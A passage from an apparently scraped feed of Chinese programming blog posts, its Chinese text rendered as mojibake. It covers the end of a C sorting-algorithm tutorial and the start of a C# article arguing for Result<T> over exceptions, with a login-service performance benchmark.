\"file2.txt\";\n\tconst char* mfile = \"mfile.txt\";\n\tint m = 100000;//æ¯æ¬¡è¯»å…¥çš„æ•°æ®ä¸ªæ•°\n\tReadNDataSortToFile(file, m, file1);\n\tReadNDataSortToFile(file, m, file2);\n\twhile (1) {\n\t\t//å°†file1å’Œfile2å½’å¹¶åœ¨ä¸€èµ·\n\t\tMergeSortToFile(file1, file2, mfile);\n\t\t//å½’å¹¶åœ¨ä¸€èµ·ååˆ é™¤file1å’Œfile2\n\t\tremove(file1);\n\t\tremove(file2);\n\t\t//å†å°†mfileåå­—æ”¹æˆfile1,å¾ªç¯æ“ä½œ\n\t\trename(mfile, file1);\n\t\tif (ReadNDataSortToFile(file, m, file2) == 0)\n\t\t\tbreak;\n\t}\n\tfclose(file);\n}\n</code></pre>\n</details>\n<h2 id=\"æ’åºæµ‹è¯•\">æ’åºæµ‹è¯•</h2>\n<details>\nç‚¹å‡»æŸ¥çœ‹ä»£ç \n<pre><code>#include\"Sort.h\"\n\nvoid SortTest() {\n\tsrand((unsigned int)time(NULL));\n\tint N = 10000000;\n\tint* a1 = (int*)malloc(N * sizeof(int));\n\tint* a2 = (int*)malloc(N * sizeof(int));\n\tint* a3 = (int*)malloc(N * sizeof(int));\n\tint* a4 = (int*)malloc(N * sizeof(int));\n\tint* a5 = (int*)malloc(N * sizeof(int));\n\tint* a6 = (int*)malloc(N * sizeof(int));\n\tint* a7 = (int*)malloc(N * sizeof(int));\n\tint* a8 = (int*)malloc(N * sizeof(int));\n\tfor (int i = 0; i &lt; N; i++) {\n\t\ta1[i] = rand() + i+100;\n\t\ta2[i] = a1[i];\n\t\ta3[i] = a1[i];\n\t\ta4[i] = a1[i];\n\t\ta5[i] = a1[i];\n\t\ta6[i] = a1[i];\n\t\ta7[i] = a1[i];\n\t\ta8[i] = a1[i];\n\t}\n\n\t//å†’æ³¡æ’åº\n\tint begin = clock();\n\tBubbleSort(a1, N);\n\tint end = clock();\n\tprintf(\"BubbleSort:%d\\n\", end - begin);\n\n\t//å †æ’åº\n\tbegin = clock();\n\tHeapSort(a2,N);\n\tend = clock();\n\tprintf(\"HeapSort:%d\\n\", end - begin);\n\n\t//æ’å…¥æ’åº\n\tbegin = clock();\n\tInsertSort(a3,N);\n\tend = clock();\n\tprintf(\"InsertSort:%d\\n\", end - begin);\n\n\t//å¸Œå°”æ’åº\n\tbegin = clock();\n\tShellSort(a4, N);\n\tend = clock();\n\tprintf(\"ShellSort:%d\\n\", end - begin);\n\n\t//é€‰æ‹©æ’åº\n\tbegin = clock();\n\tSelectSort(a5, N);\n\tend = clock();\n\tprintf(\"SelectSort:%d\\n\", end - begin);\n\n\t//å¿«æ’\n\tbegin = clock();\n\tQuickSort(a6, 0,N-1);\n\tend = clock();\n\tprintf(\"QuickSort:%d\\n\", end - begin);\n\n\t//å½’å¹¶æ’åº\n\tbegin = clock();\n\tMergeSort(a7, N);\n\tend = clock();\n\tprintf(\"MergeSort:%d\\n\", end - begin);\n\n\t//è®¡æ•°æ’åº\n\tbegin = clock();\n\tCountSort(a8, N);\n\tend = clock();\n\tprintf(\"CountSort:%d\\n\", end - begin);\n\n\t//éªŒè¯æ˜¯å¦æ’æ­£ç¡®\n\tint Flag = 1;\n\tfor (int i = 0; i &lt; N; i++) {\n\t\tif (a8[i] != a7[i])\n\t\t\tFlag = 0;\n\t}\n\tif (Flag == 1) {\n\t\tprintf(\"è®¡æ•°æ’åºæ­£ç¡®\\n\");\n\t}\n\telse {\n\t\tprintf(\"è®¡æ•°æ’åºé”™è¯¯\\n\");\n\t}\n}\n</code></pre>\n</details>\n<h1 id=\"ä¸‰æ€»ç»“\">ä¸‰ã€æ€»ç»“</h1>\n<p>æ•°æ®é‡å°å—?-&gt;æ’å…¥æ’åº<br />\néœ€è¦ç¨³å®šæ’åº?-&gt;å½’å¹¶æ’åº/è®¡æ•°æ’åº<br />\næ•°æ®åœ¨ç£ç›˜è¿˜æ˜¯åœ¨å†…å­˜?-&gt;ç£ç›˜é€‰æ‹©å½’å¹¶ï¼Œå†…å­˜é€‰å¿«æ’<br />\nå†…å­˜èµ„æºç´§å¼ å—?-&gt;åŸåœ°æ’åº(å¿«æ’/å¸Œå°”/å †æ’)</p>\n<h3 id=\"æ²¡æœ‰æœ€å¥½çš„æ’åºç®—æ³•åªæœ‰æœ€é€‚åˆçš„æ’åºç®—æ³•\">æ²¡æœ‰æœ€å¥½çš„æ’åºç®—æ³•ï¼Œåªæœ‰æœ€é€‚åˆçš„æ’åºç®—æ³•</h3>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-20 20:19</span>&nbsp;\n<a href=\"https://www.cnblogs.com/niukwuy\">æ¨é—´</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">0</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    },
    {
      "title": "å‘Šåˆ« throw exceptionï¼ä¸ºä»€ä¹ˆ Result<T> æ‰æ˜¯ä¸šåŠ¡é€»è¾‘çš„æ­£ç¡®é€‰æ‹©",
      "link": "https://www.cnblogs.com/diamondhusky/p/19508626",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/diamondhusky/p/19508626\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäº 2026-01-20 19:40\">\n    <span>å‘Šåˆ« throw exceptionï¼ä¸ºä»€ä¹ˆ Result&lt;T&gt; æ‰æ˜¯ä¸šåŠ¡é€»è¾‘çš„æ­£ç¡®é€‰æ‹©</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p></p><div class=\"toc\"><div class=\"toc-container-header\">ç›®å½•</div><ul><li><a href=\"#å¼•è¨€ä¸€ä¸ªæ™®éå­˜åœ¨çš„åå‘³é“\" rel=\"noopener nofollow\">å¼•è¨€ï¼šä¸€ä¸ªæ™®éå­˜åœ¨çš„â€œåå‘³é“â€</a></li><li><a href=\"#ä¸€å¼‚å¸¸çš„åŸç½ª--æˆ‘ä»¬ä¸€ç›´åœ¨æ»¥ç”¨å®ƒ\" rel=\"noopener nofollow\">ä¸€ã€å¼‚å¸¸çš„â€œåŸç½ªâ€ â€”â€” æˆ‘ä»¬ä¸€ç›´åœ¨æ»¥ç”¨å®ƒ</a><ul><li><a href=\"#11-å¼‚å¸¸çš„æœ¬è´¨æ˜¯ä»€ä¹ˆ\" rel=\"noopener nofollow\">1.1 å¼‚å¸¸çš„æœ¬è´¨æ˜¯ä»€ä¹ˆï¼Ÿ</a></li><li><a href=\"#12-ä¸šåŠ¡é€»è¾‘--å¼‚å¸¸æƒ…å†µ\" rel=\"noopener nofollow\">1.2 ä¸šåŠ¡é€»è¾‘ â‰  å¼‚å¸¸æƒ…å†µ</a></li></ul></li><li><a href=\"#äºŒresultä¸šåŠ¡é€»è¾‘çš„ä¼˜é›…é™çº§\" rel=\"noopener nofollow\">äºŒã€Resultâ€”â€”ä¸šåŠ¡é€»è¾‘çš„\"ä¼˜é›…é™çº§\"</a><ul><li><a href=\"#21-ä»€ä¹ˆæ˜¯result\" rel=\"noopener nofollow\">2.1 ä»€ä¹ˆæ˜¯Resultï¼Ÿ</a></li><li><a href=\"#22-å¦‚ä½•æ­£ç¡®ä½¿ç”¨result\" rel=\"noopener nofollow\">2.2 å¦‚ä½•æ­£ç¡®ä½¿ç”¨Resultï¼Ÿ</a></li></ul></li><li><a href=\"#ä¸‰æ€§èƒ½å¯¹å†³--å‡ è¿‘ç¢¾å‹çš„æ€§èƒ½å·®è·\" rel=\"noopener nofollow\">ä¸‰ã€æ€§èƒ½å¯¹å†³ â€”â€” å‡ è¿‘ç¢¾å‹çš„æ€§èƒ½å·®è·</a><ul><li><a href=\"#31-éƒ¨åˆ†æµ‹è¯•ä»£ç \" rel=\"noopener nofollow\">3.1 éƒ¨åˆ†æµ‹è¯•ä»£ç </a></li><li><a href=\"#32-æµ‹è¯•ç»“æœè§¦ç›®æƒŠå¿ƒ\" rel=\"noopener nofollow\">3.2 æµ‹è¯•ç»“æœï¼šè§¦ç›®æƒŠå¿ƒ</a></li><li><a href=\"#33-å¹¶å‘åœºæ™¯ä¸‹æ€§èƒ½å·®è·ä¾æ—§ä¸å¿ç›´è§†\" rel=\"noopener nofollow\">3.3 å¹¶å‘åœºæ™¯ä¸‹ï¼šæ€§èƒ½å·®è·ä¾æ—§ä¸å¿ç›´è§†</a></li></ul></li><li><a href=\"#å››ä¸ºä»€ä¹ˆå¼‚å¸¸åœ¨ä¸šåŠ¡åœºæ™¯ä¸‹å¦‚æ­¤æ˜‚è´µ\" rel=\"noopener nofollow\">å››ã€ä¸ºä»€ä¹ˆå¼‚å¸¸åœ¨ä¸šåŠ¡åœºæ™¯ä¸‹å¦‚æ­¤\"æ˜‚è´µ\"ï¼Ÿ</a><ul><li><a href=\"#41-clrå¼‚å¸¸æœºåˆ¶çš„åº•å±‚åŸç†\" rel=\"noopener nofollow\">4.1 CLRå¼‚å¸¸æœºåˆ¶çš„åº•å±‚åŸç†</a><ul><li><a href=\"#411-å¼‚å¸¸å¯¹è±¡çš„æ„é€ è¿‡ç¨‹\" rel=\"noopener nofollow\">4.1.1 å¼‚å¸¸å¯¹è±¡çš„æ„é€ è¿‡ç¨‹</a></li><li><a href=\"#412-å †æ ˆè·Ÿè¸ªçš„çœŸå®ä»£ä»·\" rel=\"noopener nofollow\">4.1.2 å †æ ˆè·Ÿè¸ªçš„çœŸå®ä»£ä»·</a></li><li><a href=\"#413-jitå’Œaotç¼–è¯‘å¯¹å¼‚å¸¸çš„å½±å“\" rel=\"noopener nofollow\">4.1.3 JITå’ŒAOTç¼–è¯‘å¯¹å¼‚å¸¸çš„å½±å“</a></li></ul></li><li><a href=\"#42-å¼‚å¸¸å¤„ç†çš„å†…å­˜åˆ†é…ç»†èŠ‚\" rel=\"noopener nofollow\">4.2 å¼‚å¸¸å¤„ç†çš„å†…å­˜åˆ†é…ç»†èŠ‚</a><ul><li><a href=\"#421-å¼‚å¸¸å¯¹è±¡çš„å†…å­˜å¸ƒå±€\" rel=\"noopener nofollow\">4.2.1 å¼‚å¸¸å¯¹è±¡çš„å†…å­˜å¸ƒå±€</a></li><li><a href=\"#422-gcçš„å½±å“\" rel=\"noopener nofollow\">4.2.2 GCçš„å½±å“</a></li></ul></li><li><a href=\"#43-cpuçº§åˆ«çš„æ€§èƒ½å½±å“\" rel=\"noopener nofollow\">4.3 CPUçº§åˆ«çš„æ€§èƒ½å½±å“</a><ul><li><a href=\"#431-ç°ä»£cpuçš„å¼‚å¸¸å¤„ç†å¼€é”€\" rel=\"noopener nofollow\">4.3.1 ç°ä»£CPUçš„å¼‚å¸¸å¤„ç†å¼€é”€</a></li><li><a href=\"#432-å¯¹æ¯”æ­£å¸¸è¿”å›å’Œå¼‚å¸¸è¿”å›\" rel=\"noopener nofollow\">4.3.2 å¯¹æ¯”æ­£å¸¸è¿”å›å’Œå¼‚å¸¸è¿”å›</a></li></ul></li><li><a href=\"#44-å¯¹æ¯”å…¶ä»–ç¼–ç¨‹è¯­è¨€\" rel=\"noopener nofollow\">4.4 å¯¹æ¯”å…¶ä»–ç¼–ç¨‹è¯­è¨€</a><ul><li><a href=\"#441-javaçš„å¼‚å¸¸æœºåˆ¶\" rel=\"noopener nofollow\">4.4.1 Javaçš„å¼‚å¸¸æœºåˆ¶</a></li><li><a href=\"#442-goçš„é”™è¯¯å¤„ç†å“²å­¦\" rel=\"noopener nofollow\">4.4.2 Goçš„é”™è¯¯å¤„ç†å“²å­¦</a></li><li><a href=\"#443-rustçš„resultç±»å‹\" rel=\"noopener nofollow\">4.4.3 Rustçš„Resultç±»å‹</a></li><li><a href=\"#444-cçš„é”™è¯¯å¤„ç†\" rel=\"noopener nofollow\">4.4.4 C++çš„é”™è¯¯å¤„ç†</a></li></ul></li><li><a href=\"#45-net-coreçš„æ”¹è¿›å’Œå±€é™\" rel=\"noopener nofollow\">4.5 .NET Coreçš„æ”¹è¿›å’Œå±€é™</a></li></ul></li><li><a href=\"#äº”resultçš„è¿›é˜¶ä¼˜åŠ¿\" rel=\"noopener nofollow\">äº”ã€Resultçš„è¿›é˜¶ä¼˜åŠ¿</a><ul><li><a href=\"#51-ä¸°å¯Œçš„é”™è¯¯ä¿¡æ¯\" rel=\"noopener nofollow\">5.1 ä¸°å¯Œçš„é”™è¯¯ä¿¡æ¯</a></li><li><a href=\"#52-å‡½æ•°å¼ç¼–ç¨‹æ”¯æŒ\" rel=\"noopener nofollow\">5.2 å‡½æ•°å¼ç¼–ç¨‹æ”¯æŒ</a></li><li><a href=\"#53-æ›´å¥½çš„apiè®¾è®¡\" rel=\"noopener nofollow\">5.3 æ›´å¥½çš„APIè®¾è®¡</a></li></ul></li><li><a href=\"#å…­-resultæ¨¡å¼çš„ä¸€äº›å¼Šç«¯\" rel=\"noopener nofollow\">å…­ã€ Resultæ¨¡å¼çš„ä¸€äº›å¼Šç«¯</a><ul><li><a href=\"#61-ifåœ°ç‹±é—®é¢˜æ¡ä»¶åˆ¤æ–­æ³›æ»¥\" rel=\"noopener nofollow\">6.1 \"ifåœ°ç‹±\"é—®é¢˜ï¼ˆæ¡ä»¶åˆ¤æ–­æ³›æ»¥ï¼‰</a></li><li><a href=\"#62-å€¼ç±»å‹structvs-å¼•ç”¨ç±»å‹classçš„ä¸¤éš¾é€‰æ‹©\" rel=\"noopener nofollow\">6.2 å€¼ç±»å‹ï¼ˆstructï¼‰vs å¼•ç”¨ç±»å‹ï¼ˆclassï¼‰çš„ä¸¤éš¾é€‰æ‹©</a></li><li><a href=\"#63-å¼‚æ­¥ç¼–ç¨‹çš„å¤æ‚æ€§\" rel=\"noopener nofollow\">6.3 å¼‚æ­¥ç¼–ç¨‹çš„å¤æ‚æ€§</a></li><li><a href=\"#64-ç±»å‹ç³»ç»Ÿå†—é•¿\" rel=\"noopener nofollow\">6.4 ç±»å‹ç³»ç»Ÿå†—é•¿</a></li><li><a href=\"#65-å…¶ä»–é—®é¢˜\" rel=\"noopener nofollow\">6.5 å…¶ä»–é—®é¢˜</a></li></ul></li><li><a href=\"#ä¸ƒå¸¸è§é—®é¢˜ä¸ç­”ç–‘\" rel=\"noopener nofollow\">ä¸ƒã€å¸¸è§é—®é¢˜ä¸ç­”ç–‘</a></li><li><a href=\"#å…«æ€»ç»“\" rel=\"noopener nofollow\">å…«ã€æ€»ç»“</a></li></ul></div><p></p>\n<h1 id=\"å¼•è¨€ä¸€ä¸ªæ™®éå­˜åœ¨çš„åå‘³é“\">å¼•è¨€ï¼šä¸€ä¸ªæ™®éå­˜åœ¨çš„â€œåå‘³é“â€</h1>\n<p>å¦‚æœä½ åœ¨C#é¡¹ç›®ä¸­çœ‹åˆ°è¿™æ ·çš„ä»£ç ï¼Œä¸€å®šä¸ä¼šæ„Ÿåˆ°é™Œç”Ÿï¼š</p>\n<pre><code class=\"language-csharp\">public User Login(string username, string password)\n{\n    var user = FindUser(username);\n    if (user == null)\n        throw new Exception(\"ç”¨æˆ·ä¸å­˜åœ¨\");  // âŒ ç†Ÿæ‚‰çš„æ¨¡å¼\n    \n    if (!VerifyPassword(user, password))\n        throw new Exception(\"å¯†ç é”™è¯¯\");    // âŒ å¦ä¸€ä¸ªç†Ÿæ‚‰çš„æ¨¡å¼\n    \n    return user;\n}\n</code></pre>\n<p>è¿™ç§ä½¿ç”¨å¼‚å¸¸æ¥å¤„ç†ä¸šåŠ¡é€»è¾‘çš„åšæ³•ï¼Œå‡ ä¹æˆäº†C#å¼€å‘çš„â€œæ ‡å‡†èŒƒå¼â€ã€‚<br />\nå¯æ˜¯ï¼Œ<strong>ä»æ¥å¦‚æ­¤ï¼Œä¾¿æ˜¯å¯¹çš„ä¹ˆï¼Ÿ</strong></p>\n<h1 id=\"ä¸€å¼‚å¸¸çš„åŸç½ª--æˆ‘ä»¬ä¸€ç›´åœ¨æ»¥ç”¨å®ƒ\">ä¸€ã€å¼‚å¸¸çš„â€œåŸç½ªâ€ â€”â€” æˆ‘ä»¬ä¸€ç›´åœ¨æ»¥ç”¨å®ƒ</h1>\n<h2 id=\"11-å¼‚å¸¸çš„æœ¬è´¨æ˜¯ä»€ä¹ˆ\">1.1 å¼‚å¸¸çš„æœ¬è´¨æ˜¯ä»€ä¹ˆï¼Ÿ</h2>\n<p>é¦–å…ˆï¼Œæˆ‘ä»¬è¦æ˜ç™½C#è¯­è¨€é‡Œçš„å¼‚å¸¸ï¼ˆExceptionï¼‰çš„è®¾è®¡åˆè¡·ï¼š</p>\n<pre><code class=\"language-csharp\">// è¿™äº›æ‰æ˜¯å¼‚å¸¸çœŸæ­£çš„ä½¿ç”¨åœºæ™¯ï¼š\npublic void ReadFile(string path)\n{\n    if (string.IsNullOrEmpty(path))\n        throw new ArgumentNullException(nameof(path));  // âœ… å‚æ•°æ£€æŸ¥\n    \n    if (!File.Exists(path))\n        throw new FileNotFoundException($\"æ–‡ä»¶ä¸å­˜åœ¨: {path}\");  // âœ… ç³»ç»Ÿé”™è¯¯\n    \n    // å°è¯•è¯»å–æ–‡ä»¶ï¼Œå¯èƒ½æŠ›å‡ºIOExceptionç­‰\n    var content = File.ReadAllText(path);\n}\n</code></pre>\n<p>å¼‚å¸¸æ˜¯ä¸ºçœŸæ­£çš„\"å¼‚å¸¸æƒ…å†µ\"è®¾è®¡çš„ï¼Œæ¯”å¦‚ï¼š</p>\n<ul>\n<li>ç³»ç»Ÿèµ„æºä¸å¯ç”¨ï¼ˆæ–‡ä»¶ä¸å­˜åœ¨ã€æ•°æ®åº“è¿æ¥å¤±è´¥ï¼‰</li>\n<li>ç¨‹åºçŠ¶æ€å¼‚å¸¸ï¼ˆç©ºæŒ‡é’ˆã€æ•°ç»„è¶Šç•Œï¼‰</li>\n<li>å‚æ•°éªŒè¯å¤±è´¥ï¼ˆå‰ç½®æ¡ä»¶ä¸æ»¡è¶³ï¼‰</li>\n</ul>\n<h2 id=\"12-ä¸šåŠ¡é€»è¾‘--å¼‚å¸¸æƒ…å†µ\">1.2 ä¸šåŠ¡é€»è¾‘ â‰  å¼‚å¸¸æƒ…å†µ</h2>\n<p>ä¸šåŠ¡é”™è¯¯ï¼ˆç”¨æˆ·ä¸å­˜åœ¨ã€å¯†ç é”™è¯¯ã€ä½™é¢ä¸è¶³ï¼‰æ˜¯<strong>å¯é¢„è§çš„æ­£å¸¸ä¸šåŠ¡æµç¨‹</strong>ï¼Œè€Œä¸æ˜¯å¼‚å¸¸æƒ…å†µã€‚<br />\næŠŠä¸šåŠ¡é”™è¯¯ç”¨å¼‚å¸¸å¤„ç†ï¼Œå°±åƒï¼š</p>\n<ul>\n<li>ç”¨\"åœ°éœ‡è­¦æŠ¥\"æ¥å¤„ç†\"å®¶é‡Œæ²¡ç±³äº†\"</li>\n<li>ç”¨\"æ¶ˆé˜²è½¦\"æ¥è¿é€\"å¿«é€’åŒ…è£¹\"</li>\n<li>ç”¨\"æ‰‹æœ¯å®¤\"æ¥å¤„ç†\"æ„Ÿå†’å‘çƒ§\"</li>\n</ul>\n<p>è¿™æ˜¯å¯¹å¼‚å¸¸æœºåˆ¶çš„ä¸¥é‡æ»¥ç”¨ï¼</p>\n<h1 id=\"äºŒresultä¸šåŠ¡é€»è¾‘çš„ä¼˜é›…é™çº§\">äºŒã€Resultâ€”â€”ä¸šåŠ¡é€»è¾‘çš„\"ä¼˜é›…é™çº§\"</h1>\n<h2 id=\"21-ä»€ä¹ˆæ˜¯result\">2.1 ä»€ä¹ˆæ˜¯Resultï¼Ÿ</h2>\n<p>ä¸€ä¸ªç®€å•ï¼Œå…·å¤‡åŸºæœ¬åŠŸèƒ½çš„Resultç±»å¦‚ä¸‹ï¼š</p>\n<pre><code class=\"language-csharp\">public class Result&lt;T&gt;\n{\n    public bool Success { get; }\n    public T? Value { get; }\n    public string? Error { get; }\n    \n    private Result(T value) { Success = true; Value = value; Error = null; }\n    private Result(string error) { Success = false; Value = default; Error = error; }\n    \n    public static Result&lt;T&gt; Ok(T value) =&gt; new(value);\n    public static Result&lt;T&gt; Fail(string error) =&gt; new(error);\n}\n</code></pre>\n<h2 id=\"22-å¦‚ä½•æ­£ç¡®ä½¿ç”¨result\">2.2 å¦‚ä½•æ­£ç¡®ä½¿ç”¨Resultï¼Ÿ</h2>\n<pre><code class=\"language-csharp\">public Result&lt;User&gt; Login(string username, string password)\n{\n    if (string.IsNullOrEmpty(username))\n        return Result&lt;User&gt;.Fail(\"ç”¨æˆ·åä¸èƒ½ä¸ºç©º\");  // âœ… æ˜ç¡®è¿”å›ä¸šåŠ¡é”™è¯¯\n    \n    if (string.IsNullOrEmpty(password))\n        return Result&lt;User&gt;.Fail(\"å¯†ç ä¸èƒ½ä¸ºç©º\");    // âœ… æ˜ç¡®è¿”å›ä¸šåŠ¡é”™è¯¯\n    \n    var user = FindUser(username);\n    if (user == null)\n        return Result&lt;User&gt;.Fail(\"ç”¨æˆ·ä¸å­˜åœ¨\");      // âœ… æ˜ç¡®è¿”å›ä¸šåŠ¡é”™è¯¯\n    \n    if (!VerifyPassword(user, password))\n        return Result&lt;User&gt;.Fail(\"å¯†ç é”™è¯¯\");        // âœ… æ˜ç¡®è¿”å›ä¸šåŠ¡é”™è¯¯\n    \n    return Result&lt;User&gt;.Ok(user);                   // âœ… æ˜ç¡®è¿”å›æˆåŠŸ\n}\n</code></pre>\n<h1 id=\"ä¸‰æ€§èƒ½å¯¹å†³--å‡ è¿‘ç¢¾å‹çš„æ€§èƒ½å·®è·\">ä¸‰ã€æ€§èƒ½å¯¹å†³ â€”â€” å‡ è¿‘ç¢¾å‹çš„æ€§èƒ½å·®è·</h1>\n<h2 id=\"31-éƒ¨åˆ†æµ‹è¯•ä»£ç \">3.1 éƒ¨åˆ†æµ‹è¯•ä»£ç </h2>\n<p>é¡¹ç›®ç¯å¢ƒï¼š</p>\n<pre><code>&lt;Project Sdk=\"Microsoft.NET.Sdk\"&gt;\n\t&lt;PropertyGroup&gt;\n\t\t&lt;OutputType&gt;Exe&lt;/OutputType&gt;\n\t\t&lt;TargetFramework&gt;net8.0&lt;/TargetFramework&gt;\n\t\t&lt;ImplicitUsings&gt;enable&lt;/ImplicitUsings&gt;\n\t\t&lt;Nullable&gt;enable&lt;/Nullable&gt;\n\t\t&lt;LangVersion&gt;latest&lt;/LangVersion&gt;\n\t&lt;/PropertyGroup&gt;\n&lt;/Project&gt;\n</code></pre>\n<p>éƒ¨åˆ†æµ‹è¯•ä»£ç ï¼š</p>\n<pre><code class=\"language-csharp\"> public class LoginService\n {\n     private readonly Dictionary&lt;string, User&gt; _users = new()\n     {\n         [\"valid_user\"] = new User { Id = 1, Username = \"valid_user\" }\n     };\n\n    \n     public User LoginWithException(string username, string password)\n     {\n         if (!_users.TryGetValue(username, out var user))\n             throw new BusinessException(\"ç”¨æˆ·ä¸å­˜åœ¨\");\n\n         if (password != \"correct_password\")\n             throw new BusinessException(\"å¯†ç é”™è¯¯\");\n\n         return user;\n     }\n\n    \n     public Result&lt;User&gt; LoginWithResult(string username, string password)\n     {\n         if (!_users.TryGetValue(username, out var user))\n             return Result&lt;User&gt;.Fail(\"ç”¨æˆ·ä¸å­˜åœ¨\");\n\n         if (password != \"correct_password\")\n             return Result&lt;User&gt;.Fail(\"å¯†ç é”™è¯¯\");\n\n         return Result&lt;User&gt;.Ok(user);\n     }\n }\n</code></pre>\n<pre><code class=\"language-csharp\">public class PerformanceTester\n{\n    private readonly LoginService _service = new();\n    private readonly Random _random = new(42);\n\n    public void RunAllTests(int iterations = 1000000)\n    {\n        Console.WriteLine($\"æ€§èƒ½å¯¹æ¯”æµ‹è¯• - è¿­ä»£æ¬¡æ•°: {iterations:N0}\");\n        Console.WriteLine(\"=\".PadRight(60, '='));\n\n        // æµ‹è¯•1ï¼šæˆåŠŸè·¯å¾„ï¼ˆæ­£å¸¸æƒ…å†µï¼‰\n        TestSuccessPath(iterations);\n\n        // æµ‹è¯•2ï¼šå¤±è´¥è·¯å¾„ï¼ˆé”™è¯¯æƒ…å†µï¼‰\n        TestErrorPath(iterations);\n\n        // æµ‹è¯•3ï¼šæ··åˆè·¯å¾„ï¼ˆ30%æˆåŠŸç‡ï¼‰\n        TestMixedPath(iterations, 0.3);\n    }\n\n    private void TestSuccessPath(int iterations)\n    {\n        Console.WriteLine(\"\\næµ‹è¯•1ï¼šæˆåŠŸè·¯å¾„ï¼ˆ100%æˆåŠŸï¼‰\");\n\n        // å¼‚å¸¸æ–¹å¼\n        var exceptionTime = Measure(() =&gt;\n        {\n            try\n            {\n                _service.LoginWithException(\"valid_user\", \"correct_password\");\n            }\n            catch\n            {\n                // ä¸åº”è¯¥å‘ç”Ÿ\n            }\n        }, iterations, \"å¼‚å¸¸æ–¹å¼\");\n\n        // Resultæ–¹å¼\n        var resultTime = Measure(() =&gt;\n        {\n            var result = _service.LoginWithResult(\"valid_user\", \"correct_password\");\n            if (!result.Success)\n            {\n                // ä¸åº”è¯¥å‘ç”Ÿ\n            }\n        }, iterations, \"Resultæ–¹å¼\");\n\n        PrintComparison(exceptionTime, resultTime);\n    }\n\n    private void TestErrorPath(int iterations)\n    {\n        Console.WriteLine(\"\\næµ‹è¯•2ï¼šå¤±è´¥è·¯å¾„ï¼ˆ100%å¤±è´¥ï¼‰\");\n\n        // å¼‚å¸¸æ–¹å¼\n        var exceptionTime = Measure(() =&gt;\n        {\n            try\n            {\n                _service.LoginWithException(\"invalid_user\", \"wrong_password\");\n            }\n            catch (BusinessException)\n            {\n                // é¢„æœŸå¼‚å¸¸\n            }\n        }, iterations, \"å¼‚å¸¸æ–¹å¼\");\n\n        // Resultæ–¹å¼\n        var resultTime = Measure(() =&gt;\n        {\n            var result = _service.LoginWithResult(\"invalid_user\", \"wrong_password\");\n            if (result.Success)\n            {\n                // ä¸åº”è¯¥å‘ç”Ÿ\n            }\n        }, iterations, \"Resultæ–¹å¼\");\n\n        PrintComparison(exceptionTime, resultTime);\n    }\n\n    private void TestMixedPath(int iterations, double successRate)\n    {\n        Console.WriteLine($\"\\næµ‹è¯•3ï¼šæ··åˆè·¯å¾„ï¼ˆ{successRate:P0}æˆåŠŸç‡ï¼‰\");\n\n        // å‡†å¤‡æµ‹è¯•æ•°æ®\n        var testData = new (string user, string pwd, bool shouldSucceed)[iterations];\n        for (int i = 0; i &lt; iterations; i++)\n        {\n            testData[i] = _random.NextDouble() &lt; successRate\n                ? (\"valid_user\", \"correct_password\", true)   // æˆåŠŸ\n                : (\"invalid_user\", \"wrong_password\", false); // å¤±è´¥\n        }\n\n        // å¼‚å¸¸æ–¹å¼\n        var exceptionTime = MeasureMixed(testData, true, \"å¼‚å¸¸æ–¹å¼\");\n\n        // Resultæ–¹å¼\n        var resultTime = MeasureMixed(testData, false, \"Resultæ–¹å¼\");\n\n        PrintComparison(exceptionTime, resultTime);\n    }\n\n    private static long Measure(Action action, int iterations, string testName)\n    {\n        // é¢„çƒ­\n        for (int i = 0; i &lt; 1000; i++) action();\n\n        GC.Collect();\n        GC.WaitForPendingFinalizers();\n        GC.Collect();\n\n        var sw = Stopwatch.StartNew();\n        for (int i = 0; i &lt; iterations; i++)\n        {\n            action();\n        }\n        sw.Stop();\n\n        var opsPerSecond = iterations / (sw.ElapsedMilliseconds / 1000.0);\n        Console.WriteLine($\"  {testName}: {sw.ElapsedMilliseconds,8}ms ({opsPerSecond,12:N0} ops/s)\");\n\n        return sw.ElapsedMilliseconds;\n    }\n\n    private long MeasureMixed(\n        (string user, string pwd, bool shouldSucceed)[] testData,\n        bool useException,\n        string testName)\n    {\n        // é¢„çƒ­\n        for (int i = 0; i &lt; Math.Min(1000, testData.Length); i++)\n        {\n            var (user, pwd, _) = testData[i];\n            if (useException)\n            {\n                try\n                {\n                    _service.LoginWithException(user, pwd);\n                }\n                catch { }\n            }\n            else\n            {\n                _service.LoginWithResult(user, pwd);\n            }\n        }\n\n        GC.Collect();\n        GC.WaitForPendingFinalizers();\n        GC.Collect();\n\n        var sw = Stopwatch.StartNew();\n\n        if (useException)\n        {\n            for (int i = 0; i &lt; testData.Length; i++)\n            {\n                var (user, pwd, _) = testData[i];\n                try\n                {\n                    _service.LoginWithException(user, pwd);\n                }\n                catch { }\n            }\n        }\n        else\n        {\n            for (int i = 0; i &lt; testData.Length; i++)\n            {\n                var (user, pwd, _) = testData[i];\n                _service.LoginWithResult(user, pwd);\n            }\n        }\n\n        sw.Stop();\n\n        var opsPerSecond = testData.Length / (sw.ElapsedMilliseconds / 1000.0);\n        Console.WriteLine($\"  {testName}: {sw.ElapsedMilliseconds,8}ms ({opsPerSecond,12:N0} ops/s)\");\n\n        return sw.ElapsedMilliseconds;\n    }\n\n    private static void PrintComparison(long exceptionTime, long resultTime)\n    {\n        var speedup = exceptionTime / (double)resultTime;\n        var improvement = (exceptionTime - resultTime) * 100.0 / exceptionTime;\n\n        if (speedup &gt; 1)\n        {\n            Console.WriteLine($\"Resultæ¯”Exceptionå¿« {speedup:F1}xï¼Œæ€§èƒ½æå‡ {improvement:F1}%\");\n        }\n        else\n        {\n            Console.WriteLine($\"å·®å¼‚ä¸å¤§: {speedup:F2}x\");\n        }\n    }\n}\n</code></pre>\n<h2 id=\"32-æµ‹è¯•ç»“æœè§¦ç›®æƒŠå¿ƒ\">3.2 